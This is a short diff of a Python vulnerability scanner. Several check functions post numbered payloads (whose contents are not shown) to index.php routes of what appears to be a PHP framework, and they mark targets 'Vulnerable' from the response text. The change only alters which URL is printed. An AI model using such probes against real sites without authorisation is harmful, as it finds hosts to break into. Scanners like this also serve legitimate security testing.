@@ -19,7 +19,7 @@ def check_route(url):
     r = requests.get(url+data_route,headers=headers,timeout=1)
     s = r.text.replace(" ","").lower()
     if "path=" in s and "user" in s:
-        print(url,"route Vulnerable")
+        print(r.url,"route Vulnerable")
     else:
         print(url,"checked")
 
@@ -28,7 +28,7 @@ def check5010(url):
     r = requests.post(url+"/index.php?s=index/index/index/",data=data_5010,headers=headers,timeout=1)
     s = r.text.replace(" ","").lower()
     if "path=" in s and "user" in s:
-        print(url,"5010 Vulnerable")
+        print(r.url,"5010 Vulnerable")
     else:
         print(url,"checked")
 
@@ -36,7 +36,7 @@ def check5023(url):
     r = requests.post(url+"/index.php?s=captcha",data=data_5023,headers=headers,timeout=1)
     s = r.text.replace(" ","").lower()
     if "path=" in s and "user" in s:
-        print(url,"5023 Vulnerable")
+        print(r.url,"5023 Vulnerable")
     else:
         print(url,"checked")
         
@@ -45,7 +45,7 @@ def check5152(url):
     r = requests.post(url+"/index.php",data=data_5152,headers=headers,timeout=1)
     s = r.text.replace(" ","").lower()
     if "path=" in s and "user" in s:
-        print(url,"5152 Vulnerable")
+        print(r.url,"5152 Vulnerable")
     else:
         print(url,"checked")
     
